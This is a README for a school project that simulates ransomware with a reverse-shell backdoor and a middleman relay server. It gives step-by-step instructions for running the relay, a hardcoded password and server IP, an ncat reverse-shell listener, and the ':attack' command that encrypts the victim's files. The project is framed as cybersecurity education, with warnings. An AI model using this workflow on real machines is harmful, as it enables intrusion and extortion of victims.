# School Project: Basic Ransomware Simulation

## Project Overview

This project consists of few Python scripts that work together to simulate the behavior of real-life ransomware:

### `notaransomware.py`:

This is the main ransomware code. It contains functions to find and encrypt files using a key generated from the `cryptography.fernet` Python module. Before encryption, the script establishes a connection with the middleman server to retrieve the LAN IP of the target device to set up the backdoor (more on the backdoor later).

### `decrypt.py`:

This file contains the code to decrypt files that have been encrypted by the ransomware. The script retrieves the encryption key from "thekey.key" and applies it to the encrypted files, restoring them to their original form.

### `middleserver.py`:

This script acts as the middleman server. This script manages connections for two different sessions:

- Setting the local IP for the `notaransomware.py` script to give a reverse shell to (password protected).

- Providing the said IP to our ransomware.

That is to say that the middleman script will allow a connection from the attackers machine in order for said machine to advertise its local IP and another session, on the victim machine, for the ransomware to fetch said LAN IP.
It does not have to be a local IP though, any IP will work but LAN is more secure.

## Why a backdoor and why a middleman?

We have the backdoor, or reverse shell, in order for the attacker to examine the target in order to find the best files in which to hold ransom. Once the attacker has found the files to encrypt, he executes a command within the reverse shell (running within the `notaransomware.py` script) which will finalize the attack.

We have the middle man because the attackers IP might change but the middleman servers IP can stay constant.

## :warning: Word of warning :warning:

USE THIS PROJECT AT YOUR OWN RISK, THE PROJECT IS DESIGNED TO BE AS REAL TO REAL LIFE RANSOMWARE ATTACK AS IT CAN BE SO YOUR DATA IS YOUR RESPONSIBILITY.

I **ONLY** RECOMMEND RUNNING THESE SCRIPTS INSIDE A VIRTUAL MACHINE!!!

**NO ONE BUT YOU IS RESPONSIBLE FOR YOUR ACTIONS!**

## How To Run

To correctly execute these programs, you will need Python3 venv (virtual environment) and the `cryptography` package installed inside said venv.

To create a venv, first, remember that all these scripts are designed to work on windows.

Then open the microsoft store and download windows terminal for ease of use.

Next install git for windows in a new powershell admin window if you haven't already:

```ps1
winget install --id Git.Git -e --source winget
```

Once git is installed, open a new git bash windows inside windows terminal and type the following:

```bash
python3
```

This should open a window in the microsoft store where you can download python.
If you already have it installed however, it will launch the python interpreter.
To exit the interpreter:

```py
exit()
```

Next, inside the git bash session and inside the root directory of the project, create the venv:

```bash
python -m venv venv
```

We must source, again, inside the git bash session and in the root of the project, the venv activation file before we can work with the project:

```bash
source ./venv/Scripts/activate
```

Now, once we are inside a venv session, we can finally install the dependencies:

```bash
pip install cryptography
```

Finally, to start the simulation:

- On your middleman server, mines in the cloud, launch the middleman server with the command `python middleserver.py`.

> Of course, to do this, one must have the `middleserver.py` on said cloud server.

You will see the server spring to life, printing basic messages to let you know whats going on.

- On the attack machine, preferably inside the same LAN as the victim computer:

1. [Make sure you have netcat installed](https://nmap.org/download), ncat is bundle with nmap...
2. Assuming the attack machine is windows, run `ncat <ip> 55036` where `<ip>` is the ipv4 address of your middleman server.

This will connect to the middleman server but, assuming no errors show up, you will see no output.
This is by design but all you have to do is enter in the password and hit enter:

```
joelwiscool
```

Once you do this, you should see the following output:

```
$ ncat 175.45.180.103 55036
joelwiscool

[type :help for help]->
```

To set the LAN ip of the attack machine so the middleman server can advertise it to the victim computer:

```
$ ncat 175.45.180.103 55036
joelwiscool

[type :help for help]-> :ip 127.0.0.1
```

As you see, for my testing purposes, i am using the same machine for the victim and attack but you may change `127.0.0.1` to any IP you see fit.

3. Next, still on the attack machine remember, we must first exit out of the previous netcat session in which we set the LAN IP for our ransomware by hitting CTRL+c thats control and the letter c at the same time. After exiting the previous netcat session, open a new one, this new netcat session will be where our reverse shell appears:

```bash
ncat -lvnp 55038
```

This will instruct netcat to listen (`-l`), output verbosely (`-v`), idk (`-n`), and `-p` specifies the port.

You will use this netcat session once the ransomware opens a backdoor for us.

- Next, on your victim computer, run the ransomware with the command `python notaransomware.py <ip>` where ip is th ipv4 address of your middleman server.

The script immediately try connecting to the middleman server, if it fails to connect, it will retry and retry again.

Once it has connected to the middleman server, it will ask the middleman server for the attackers ip.
Once received the attackers IP, the ransomware script will open a backdoor to the attacker.

The attacker can then go on looking for some juicy files within the system to encrypt (your job).
Once you found your juicy files, run `:attack` inside the backdoor (again, the netcat seesion).

4. If you want to decrypt files, run `python decrypt.py`

Ensure the scripts run on machines within the same network.

Remember to be responsible when running these scripts! Do not attempt to run the ransomware on any computer to which you do not have explicit permission.

## Understanding the Code

Take the time to go through the Python scripts and understand how they work together. This can be very beneficial in improving your understanding of real-world cyber threats and how to protect yourself (or a network you manage) from them.

Ransomware is an unfortunate reality of the modern world, and understanding how it works is an important part of any cybersecurity education. This project is a simplified example of a real-world ransomware attack, but the concepts here – secure keys, file encryption, network communication – are directly applicable to advanced threats. Be sure to read and understand the comments in the code, as they are there to help you understand what's happening!

## Contributing

This being a school project, collaboration is welcomed! If you have any ideas on how to improve the simulation or the readability of the code, don't hesitate to make changes and submit a pull request.
